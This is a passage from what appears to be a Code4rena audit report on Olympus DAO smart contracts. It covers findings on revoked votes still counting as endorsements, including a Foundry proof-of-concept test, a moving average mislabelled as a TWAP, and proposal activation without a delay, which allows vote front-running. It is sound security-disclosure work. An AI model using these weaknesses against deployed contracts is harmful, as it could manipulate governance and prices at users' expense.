3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Please append the following test in <code>src\\test\\policies\\Governance.t.sol</code>. This test will pass to demonstrate the described scenario.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testScenario_EndorsedVotesDoNotDecreaseAfterVotesAreRevoked</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_submitProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// voter3 endorse the proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">endorseProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">userEndorsementsForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalEndorsementsForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// to simulate calling VoterRegistration.revokeVotesFrom that burns voter3&#39;s votes, VOTES.burnFrom is called by godmode here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">godmode</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">burnFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">, </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// at this moment, voter3 has 0 votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VOTES</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// however, the proposal is still endorsed with voter3&#39;s previous votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">userEndorsementsForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voter3</span><span class=\"mtk1\">), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governance</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalEndorsementsForProposal</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">300</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When <code>revokeVotesFrom</code> is called during the time for endorsement, the corresponding votes that are previously endorsed for a proposal and are now revoked should be removed from the proposal’s endorsed votes for the user. This ensures that the endorsed votes and the votes’ total supply after the revocation are in sync for the proposal.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/257#issuecomment-1235877095\">fullyallocated (Olympus) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>This is true, and I appreciate the throughness of the explanation—it’s hard to adjust endorsements based on the user’s balance because there’s no events/callbacks in solidity. We plan to use a staking vault where tokens are transfer locked and there’s a warmup period + cooldown period to mitigate this issue.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-twap-used-is-an-observation-weighted-average-price-not-a-time-weighted-one\" style=\"position:relative;\"><a href=\"#m-08-twap-used-is-an-observation-weighted-average-price-not-a-time-weighted-one\" aria-label=\"m 08 twap used is an observation weighted average price not a time weighted one permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/267\">[M-08] “TWAP” used is an observation-weighted-average-price, not a time-weighted one</a></h2>\n<p><em>Submitted by IllIllI</em></p>\n<p>While users are incentivized to call the heartbeat, the incentive may be removed later, or it may be more profitable to use old prices, so users may not call the heartbeat during unfavorable prices, leading to the TWAP price being incorrect, and users getting the wrong price for their assets.</p>\n<p>A similar case of an incomplete TWAP algorithm was found to be of <a href=\"https://github.com/code-423n4/2022-06-nibbl-findings/issues/191\">Medium</a> risk.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>A TWAP is a Time-Weighted average price, but the algorithm below does not take into account the time between observations:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">modules</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">          </span><span class=\"mtk3\">// Calculate new moving average</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">earliestPrice</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">              </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\"> += (</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">earliestPrice</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">numObs</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">          } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">              </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\"> -= (</span><span class=\"mtk12\">earliestPrice</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">numObs</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">          }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">          </span><span class=\"mtk3\">// Push new observation into storage and store timestamp taken at</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">          </span><span class=\"mtk12\">observations</span><span class=\"mtk1\">[</span><span class=\"mtk12\">nextObsIndex</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">          </span><span class=\"mtk12\">lastObservationTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint48</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">nextObsIndex</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">nextObsIndex</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) % </span><span class=\"mtk12\">numObs</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L134-L144\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L134-L144</a></p>\n<p>While the <code>Heart</code> policy enforces an upper bound on how frequently updates are added to the average, there is no guarantee that users call <code>beat()</code> in a timely manner:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">policies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Heart</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">92</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">beat</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">93</span><span class=\"mtk1\">           </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">active</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Heart_BeatStopped</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">lastBeat</span><span class=\"mtk1\"> + </span><span class=\"mtk11\">frequency</span><span class=\"mtk1\">()) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Heart_OutOfCycle</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L94\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L94</a></p>\n<p>The incentive may be set to too low an amount:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">policies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Heart</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">   #</span><span class=\"mtk7\">3</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setRewardTokenAndAmount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reward_</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">141          </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">142          </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;heart_admin&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">143      {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">144</span><span class=\"mtk1\">          </span><span class=\"mtk12\">rewardToken</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">145</span><span class=\"mtk1\">          </span><span class=\"mtk12\">reward</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">reward_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">146</span><span class=\"mtk1\">          </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">RewardUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reward_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">147</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L140-L147\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L140-L147</a></p>\n<p>Or users may find it more profitable to skip a particular update, or front-run an unfavorable update, with a transaction that trades assets at the old price</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Always call an internal version of <code>beat()</code> that doesn’t revert, in functions that swap user assets. The code should also track the timestamps of when each <code>beat()</code> is called, and include the amount of time that has passed since the last beat, in the TWAP calculation</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1241043919\">Oighty (Olympus) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>The referenced issue is a bit different than our use case since we will be using a much longer duration moving average. The goal is to get an approximate moving average over a certain period of time (e.g. 120 days) vs. an exact number since, as you say, the time of each observation cannot be guaranteed to be at a specific time. We believe that using a long duration with a sufficient number of observations will make this value close enough to the true value it is approximating, and prevents actors from manipulating the value by waiting to provide a specific value (1 out of ~360 obs doesn’t move the needle). The use of the “TWAP” term may be semantically inaccurate.</p>\n<p>As for not guaranteeing that the update will be called or issues with several observations close to each other, see comments on <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/405\">#405</a> and <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/79\">#79</a>.</p>\n<p>The mitigations suggested do not seem to provide a solution that improves the system. Calling <code>beat()</code> on user actions would not have the observations roughly evenly spaced. Tracking timestamps is possible, but I don’t see how it improves the data.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1251044977\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@Oighty - I think the warden is suggesting that the call to beat() in the user actions would do more to ensure that the “TWAP” stays up to date.  If the call isn’t past the correct period, it would just return and make no change (costing some amount of gas, ofc).</p>\n<p>I do think it may be worth considering, that way no user action can take place without the TWAP being as up to date as possible and no additional calls to the contract may be necessary if users are interacting with the contract frequently enough. </p>\n<p>While this is related to <a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/79\">#79</a> - I think the points raised here and the mitigation is sufficiently different to warrant this issue to stand alone.  </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/267#issuecomment-1255235303\">Oighty (Olympus) commented</a>:</strong></p>\n<blockquote>\n<p>That’s a fair point. One issue with calling <code>beat</code> on user actions, e.g. <code>Operator.swap</code>, is that it would update the wall price that the user is swapping at. Therefore, the call could fail due to the slippage check. This could be confusing behavior and may have unintended consequences of DOS’ing the system. Additionally, the gas cost of <code>beat</code> is highly variable (sometimes up to 600k gas when opening a bond market) and would cause some users to unexpectedly pay a lot more gas for a swap.</p>\n<p>I’ll discuss with the team, but I don’t think the pros exceed the cons.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-activateproposal-need-time-delay\" style=\"position:relative;\"><a href=\"#m-09-activateproposal-need-time-delay\" aria-label=\"m 09 activateproposal need time delay permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-olympus-findings/issues/273\">[M-09] <code>activateProposal()</code> need time delay</a></h2>\n<p><em>Submitted by __141345__, also found by 0x1f8b, Trust, V_B, and zzzitron</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205-L262\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205-L262</a><br></p>\n<p>There is no time lock or delay when activating a proposal, the previous one could be replaced immediately. In <code>vote()</code> call, a user might want to vote for the previous proposal, but if the <code>vote()</code> call and the <code>activateProposal()</code> is very close or even in the same block, it is quite possible that the user actually voted for another proposal without much knowledge of. A worse case is some malicious user watching the mempool, and front run a big vote favor/against the <code>activeProposal</code>, effectively influence the voting result.</p>\n<p>These situations are not what the governance intends to deliver, and might also affect the results of 2 proposals.</p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>activateProposal()</code> can take effect right away, replacing the <code>activeProposal</code>. And <code>vote()</code> does not specify which <code>proposalId</code> to vote for, but the <code>activeProposal</code> could be different from last second.</p>\n<p>src/policies/Governance.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">activateProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ProposalMetadata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">getProposalMetadata</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId_</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">submitter</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NotAuthorizedToActivateProposal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">submissionTimestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">ACTIVATION_DEADLINE</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">SubmittedProposalHasExpired</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span 